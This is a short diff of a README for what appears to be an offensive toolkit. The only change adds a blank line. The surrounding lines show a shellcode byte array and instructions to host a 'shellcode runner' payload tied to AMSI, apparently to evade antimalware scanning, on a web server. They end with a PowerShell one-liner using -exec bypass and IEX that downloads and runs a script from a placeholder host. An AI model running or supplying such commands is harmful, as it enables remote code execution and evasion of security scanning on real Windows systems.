@@ -83,6 +83,7 @@ $buf = [Byte[]] (0x48,0x31,0xC0)
 ```
 
 **Execute AMSI Shellcode runner**
+
 You can copy the ```payloads/AMSI/shellcode_runner.txt``` to your web server as ```shellcode_runner.hta```
 ``` 
 powershell -nop -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('http://<IP>/shellcode_runner.html')); 
